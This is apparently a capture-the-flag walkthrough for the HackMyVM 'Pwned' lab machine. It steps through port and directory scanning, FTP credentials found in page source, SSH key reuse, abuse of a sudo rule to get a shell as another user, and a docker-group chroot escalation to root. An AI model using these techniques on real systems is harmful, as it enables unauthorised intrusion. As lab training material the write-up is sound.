### Write up for https://hackmyvm.eu/machines/machine.php?vm=Pwned ###

## Walkthrough



```bash
ip=<machine's ip>
```

```bash
nmap -v -T4 -p- -sC -sV -oN nmap.log $ip;clear;cat nmap.log
```

```bash
firefox $ip &
```

checked Page source robots.txt etc nothing found

```bash
feroxbuster -n -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip -x php,txt,html,zip,bak,htm,dic -t 100
```

we found hidden_text dir

```bash
curl http://$ip/hidden_text/secret.dic -O
```

```bash
feroxbuster -n -w  ./secret.dic -u http://$ip -x php,html,htm,zip,bak,dic -t 100
```

we found the following

```bash
http://$ip/pwned.vuln
```

Vew Page Source --> u will find creds for ftp user
```bash
ftpuser && $pw=='****TcH'
```

```bash
ncftp -u ftpuser $ip 
```

```bash
ls -al
cd share
```
mget *
exit

```bash
cat note.txt 
```
we found a user. we also got an id (id_rsa)

```bash
chmod 600 id_rsa
ssh $ip -l ariana -i id_rsa
```
you can find users flag

```bash
sudo -l
```

(selena) NOPASSWD: /home/messenger.sh
```bash
sudo -u selena /home/messenger.sh
```

```bash
/bin/bash
/bin/bash
```
id
```text
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

upgrade our shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
ls
cat user2.txt // nothing here
```

after checking id again we see that user selena is part of docker group quick search on GTFO Bins

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```
```text
root@461de093ad16:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

```bash
cat /root/root.txt
```
